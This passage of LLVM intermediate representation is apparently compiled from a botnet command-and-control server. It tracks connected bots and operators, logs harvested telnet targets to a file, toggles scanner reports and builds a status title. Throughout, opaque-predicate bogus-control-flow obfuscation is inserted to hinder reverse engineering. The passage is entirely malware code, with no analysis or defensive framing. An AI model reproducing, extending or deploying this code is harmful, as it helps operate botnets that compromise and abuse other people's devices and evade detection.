; <label>:373:                                    ; preds = %371
  %374 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %375 = call i8* @strstr(i8* %374, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #8
  %376 = icmp eq i8* %375, null
  br i1 %376, label %377, label %378

; <label>:377:                                    ; preds = %373
  store i32 1, i32* %16, align 4
  br label %541

; <label>:378:                                    ; preds = %373
  %379 = load i32, i32* @x.5
  %380 = load i32, i32* @y.6
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %378
  %387 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %387)
  %388 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %389 = call i32 @strcmp(i8* %388, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %390 = icmp eq i32 %389, 0
  %391 = load i32, i32* @x.5
  %392 = load i32, i32* @y.6
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %390, label %399, label %421

; <label>:399:                                    ; preds = %originalBBpart247
  %400 = load i32, i32* %14, align 4
  %401 = call i64 @send(i32 %400, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i64 5, i32 16384)
  %402 = icmp eq i64 %401, -1
  br i1 %402, label %403, label %404

; <label>:403:                                    ; preds = %399
  store i32 1, i32* %16, align 4
  br label %541

; <label>:404:                                    ; preds = %399
  %405 = load i32, i32* @x.5
  %406 = load i32, i32* @y.6
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %404
  %413 = load i32, i32* @x.5
  %414 = load i32, i32* @y.6
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %346

; <label>:421:                                    ; preds = %originalBBpart247
  %422 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %423 = call i8* @strstr(i8* %422, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %424 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %425 = icmp eq i8* %423, %424
  br i1 %425, label %426, label %453

; <label>:426:                                    ; preds = %421
  %427 = load i32, i32* @x.5
  %428 = load i32, i32* @y.6
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %426
  %435 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %436 = call i8* @strstr(i8* %435, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %437 = getelementptr inbounds i8, i8* %436, i64 7
  store i8* %437, i8** %19, align 8
  %438 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %439 = load i8*, i8** %19, align 8
  %440 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %438, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i32 0, i32 0), i8* %439)
  %441 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %442 = call i32 @fflush(%struct._IO_FILE* %441)
  %443 = load volatile i32, i32* @TELFound, align 4
  %444 = add nsw i32 %443, 1
  store volatile i32 %444, i32* @TELFound, align 4
  %445 = load i32, i32* @x.5
  %446 = load i32, i32* @y.6
  %447 = sub i32 %445, 1
  %448 = mul i32 %445, %447
  %449 = urem i32 %448, 2
  %450 = icmp eq i32 %449, 0
  %451 = icmp slt i32 %446, 10
  %452 = or i1 %450, %451
  br i1 %452, label %originalBBpart258, label %originalBB53alteredBB

originalBBpart258:                                ; preds = %originalBB53
  br label %346

; <label>:453:                                    ; preds = %421
  %454 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %455 = call i8* @strstr(i8* %454, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  %456 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %457 = icmp eq i8* %455, %456
  br i1 %457, label %458, label %477

; <label>:458:                                    ; preds = %453
  %459 = load i32, i32* @x.5
  %460 = load i32, i32* @y.6
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %458
  %467 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %468 = call i8* @strstr(i8* %467, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  store i8* %468, i8** %20, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  %469 = load i32, i32* @x.5
  %470 = load i32, i32* @y.6
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %346

; <label>:477:                                    ; preds = %453
  %478 = load i32, i32* @x.5
  %479 = load i32, i32* @y.6
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %477
  %486 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %487 = call i8* @strstr(i8* %486, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  %488 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %489 = icmp eq i8* %487, %488
  %490 = load i32, i32* @x.5
  %491 = load i32, i32* @y.6
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br i1 %489, label %498, label %517

; <label>:498:                                    ; preds = %originalBBpart266
  %499 = load i32, i32* @x.5
  %500 = load i32, i32* @y.6
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %498
  %507 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %508 = call i8* @strstr(i8* %507, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  store i8* %508, i8** %21, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  %509 = load i32, i32* @x.5
  %510 = load i32, i32* @y.6
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %346

; <label>:517:                                    ; preds = %originalBBpart266
  %518 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %519 = call i32 @strcmp(i8* %518, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i32 0, i32 0)) #8
  %520 = icmp eq i32 %519, 0
  br i1 %520, label %521, label %522

; <label>:521:                                    ; preds = %517
  br label %346

; <label>:522:                                    ; preds = %517
  %523 = load i32, i32* @x.5
  %524 = load i32, i32* @y.6
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %522
  %531 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %532 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i32 0, i32 0), i8* %531)
  %533 = load i32, i32* @x.5
  %534 = load i32, i32* @y.6
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %346

; <label>:541:                                    ; preds = %403, %377, %371
  %542 = load i64, i64* %17, align 8
  %543 = icmp eq i64 %542, -1
  br i1 %543, label %544, label %566

; <label>:544:                                    ; preds = %541
  %545 = call i32* @__errno_location() #9
  %546 = load i32, i32* %545, align 4
  %547 = icmp ne i32 %546, 11
  br i1 %547, label %548, label %565

; <label>:548:                                    ; preds = %544
  %549 = load i32, i32* @x.5
  %550 = load i32, i32* @y.6
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %548
  store i32 1, i32* %16, align 4
  %557 = load i32, i32* @x.5
  %558 = load i32, i32* @y.6
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %565

; <label>:565:                                    ; preds = %originalBBpart278, %544
  br label %596

; <label>:566:                                    ; preds = %541
  %567 = load i64, i64* %17, align 8
  %568 = icmp eq i64 %567, 0
  br i1 %568, label %569, label %570

; <label>:569:                                    ; preds = %566
  store i32 1, i32* %16, align 4
  br label %596

; <label>:570:                                    ; preds = %566
  br label %571

; <label>:571:                                    ; preds = %570
  %572 = load i32, i32* %16, align 4
  %573 = icmp ne i32 %572, 0
  br i1 %573, label %574, label %579

; <label>:574:                                    ; preds = %571
  %575 = load %struct.clientdata_t*, %struct.clientdata_t** %15, align 8
  %576 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %575, i32 0, i32 1
  store i8 0, i8* %576, align 4
  %577 = load i32, i32* %14, align 4
  %578 = call i32 @close(i32 %577)
  br label %579

; <label>:579:                                    ; preds = %574, %571
  %580 = load i32, i32* @x.5
  %581 = load i32, i32* @y.6
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %579
  %588 = load i32, i32* @x.5
  %589 = load i32, i32* @y.6
  %590 = sub i32 %588, 1
  %591 = mul i32 %588, %590
  %592 = urem i32 %591, 2
  %593 = icmp eq i32 %592, 0
  %594 = icmp slt i32 %589, 10
  %595 = or i1 %593, %594
  br i1 %595, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %328

; <label>:596:                                    ; preds = %569, %565
  br label %597

; <label>:597:                                    ; preds = %596
  br label %598

; <label>:598:                                    ; preds = %597
  br label %599

; <label>:599:                                    ; preds = %598, %314, %75
  %600 = load i32, i32* @x.5
  %601 = load i32, i32* @y.6
  %602 = sub i32 %600, 1
  %603 = mul i32 %600, %602
  %604 = urem i32 %603, 2
  %605 = icmp eq i32 %604, 0
  %606 = icmp slt i32 %601, 10
  %607 = or i1 %605, %606
  br i1 %607, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %599
  %608 = load i32, i32* %8, align 4
  %609 = add nsw i32 %608, 1
  store i32 %609, i32* %8, align 4
  %610 = load i32, i32* @x.5
  %611 = load i32, i32* @y.6
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBBpart288, label %originalBB84alteredBB

originalBBpart288:                                ; preds = %originalBB84
  br label %28

; <label>:618:                                    ; preds = %28
  br label %24
                                                  ; No predecessors!
  %620 = load i8*, i8** %2, align 8
  ret i8* %620

originalBBalteredBB:                              ; preds = %originalBB, %50
  %621 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %622 = load i32, i32* %8, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %621, i64 %623
  %625 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %624, i32 0, i32 0
  %626 = load i32, i32* %625, align 1
  %_ = shl i32 %626, 1
  %_1 = sub i32 %626, 1
  %gen = mul i32 %_1, 1
  %_2 = sub i32 %626, 1
  %gen3 = mul i32 %_2, 1
  %_4 = shl i32 %626, 1
  %_5 = sub i32 %626, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 %626, 1
  %gen8 = mul i32 %_7, 1
  %627 = and i32 %626, 1
  %628 = icmp ne i32 %627, 0
  br label %originalBB

originalBB9alteredBB:                             ; preds = %originalBB9, %104
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %145
  %629 = load i32, i32* %12, align 4
  %630 = icmp slt i32 %629, 1000000
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %171
  %631 = load i32, i32* %12, align 4
  %632 = load i32, i32* %11, align 4
  %633 = icmp eq i32 %631, %632
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %191
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %225
  %634 = load i32, i32* %13, align 4
  %635 = icmp ne i32 %634, 0
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %254
  %636 = load i32, i32* %11, align 4
  %637 = call i32 @make_socket_non_blocking(i32 %636)
  store i32 %637, i32* %6, align 4
  %638 = load i32, i32* %6, align 4
  %639 = icmp eq i32 %638, -1
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %278
  %640 = load i32, i32* %11, align 4
  %641 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %642 = bitcast %union.epoll_data* %641 to i32*
  store i32 %640, i32* %642, align 1
  %643 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %643, align 1
  %644 = load volatile i32, i32* @epollFD, align 4
  %645 = load i32, i32* %11, align 4
  %646 = call i32 @epoll_ctl(i32 %644, i32 1, i32 %645, %struct.epoll_event* %4) #7
  store i32 %646, i32* %6, align 4
  %647 = load i32, i32* %6, align 4
  %648 = icmp eq i32 %647, -1
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %328
  %649 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %649, i8 0, i64 2048, i32 16, i1 false)
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %349
  %650 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %651 = load i32, i32* %14, align 4
  %652 = call i32 @fdgets(i8* %650, i32 2048, i32 %651)
  %653 = sext i32 %652 to i64
  store i64 %653, i64* %17, align 8
  %654 = icmp sgt i64 %653, 0
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %378
  %655 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %655)
  %656 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %657 = call i32 @strcmp(i8* %656, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %658 = icmp eq i32 %657, 0
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %404
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %426
  %659 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %660 = call i8* @strstr(i8* %659, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %661 = getelementptr inbounds i8, i8* %660, i64 7
  store i8* %661, i8** %19, align 8
  %662 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %663 = load i8*, i8** %19, align 8
  %664 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %662, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i32 0, i32 0), i8* %663)
  %665 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %666 = call i32 @fflush(%struct._IO_FILE* %665)
  %667 = load volatile i32, i32* @TELFound, align 4
  %_54 = shl i32 %667, 1
  %_55 = sub i32 0, %667
  %gen56 = add i32 %_55, 1
  %668 = add nsw i32 %667, 1
  store volatile i32 %668, i32* @TELFound, align 4
  br label %originalBB53

originalBB60alteredBB:                            ; preds = %originalBB60, %458
  %669 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %670 = call i8* @strstr(i8* %669, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  store i8* %670, i8** %20, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %477
  %671 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %672 = call i8* @strstr(i8* %671, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  %673 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %674 = icmp eq i8* %672, %673
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %498
  %675 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %676 = call i8* @strstr(i8* %675, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  store i8* %676, i8** %21, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %522
  %677 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %678 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i32 0, i32 0), i8* %677)
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %548
  store i32 1, i32* %16, align 4
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %579
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %599
  %679 = load i32, i32* %8, align 4
  %_85 = sub i32 0, %679
  %gen86 = add i32 %_85, 1
  %680 = add nsw i32 %679, 1
  store i32 %680, i32* %8, align 4
  br label %originalBB84
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %2 = load i32, i32* @x.7
  %3 = load i32, i32* @y.8
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  %14 = load i32, i32* %11, align 4
  %15 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 3, i32 0)
  store i32 %15, i32* %12, align 4
  %16 = load i32, i32* %12, align 4
  %17 = icmp eq i32 %16, -1
  %18 = load i32, i32* @x.7
  %19 = load i32, i32* @y.8
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %17, label %26, label %27

; <label>:26:                                     ; preds = %originalBBpart2
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0))
  store i32 -1, i32* %10, align 4
  br label %37

; <label>:27:                                     ; preds = %originalBBpart2
  %28 = load i32, i32* %12, align 4
  %29 = or i32 %28, 2048
  store i32 %29, i32* %12, align 4
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %12, align 4
  %32 = call i32 (i32, i32, ...) @fcntl(i32 %30, i32 4, i32 %31)
  store i32 %32, i32* %13, align 4
  %33 = load i32, i32* %13, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %27
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0))
  store i32 -1, i32* %10, align 4
  br label %37

; <label>:36:                                     ; preds = %27
  store i32 0, i32* %10, align 4
  br label %37

; <label>:37:                                     ; preds = %36, %35, %26
  %38 = load i32, i32* @x.7
  %39 = load i32, i32* @y.8
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %10, align 4
  %47 = load i32, i32* @x.7
  %48 = load i32, i32* @y.8
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %46

originalBBalteredBB:                              ; preds = %originalBB, %1
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i32, align 4
  %58 = alloca i32, align 4
  store i32 %0, i32* %56, align 4
  %59 = load i32, i32* %56, align 4
  %60 = call i32 (i32, i32, ...) @fcntl(i32 %59, i32 3, i32 0)
  store i32 %60, i32* %57, align 4
  %61 = load i32, i32* %57, align 4
  %62 = icmp eq i32 %61, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %63 = load i32, i32* %10, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

; <label>:3:                                      ; preds = %49, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %52

; <label>:6:                                      ; preds = %3
  %7 = load i32, i32* @x.9
  %8 = load i32, i32* @y.10
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* %1, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %16
  %18 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %17, i32 0, i32 1
  %19 = load i8, i8* %18, align 4
  %20 = icmp ne i8 %19, 0
  %21 = load i32, i32* @x.9
  %22 = load i32, i32* @y.10
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %20, label %46, label %29

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i32, i32* @x.9
  %31 = load i32, i32* @y.10
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  %38 = load i32, i32* @x.9
  %39 = load i32, i32* @y.10
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %49

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i32, i32* %2, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %2, align 4
  br label %49

; <label>:49:                                     ; preds = %46, %originalBBpart24
  %50 = load i32, i32* %1, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %1, align 4
  br label %3

; <label>:52:                                     ; preds = %3
  %53 = load i32, i32* %2, align 4
  ret i32 %53

originalBBalteredBB:                              ; preds = %originalBB, %6
  %54 = load i32, i32* %1, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %55
  %57 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %56, i32 0, i32 1
  %58 = load i8, i8* %57, align 4
  %59 = icmp ne i8 %58, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i8* @TitleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

; <label>:7:                                      ; preds = %36, %1
  %8 = load i32, i32* @x.11
  %9 = load i32, i32* @y.12
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 2048, i32 16, i1 false)
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %18 = call i32 @BotsConnected()
  %19 = load volatile i32, i32* @OperatorsConnected, align 4
  %20 = call i32 (i8*, i8*, ...) @sprintf(i8* %17, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i32 27, i32 %18, i32 %19, i32 7) #7
  %21 = load i32, i32* %3, align 4
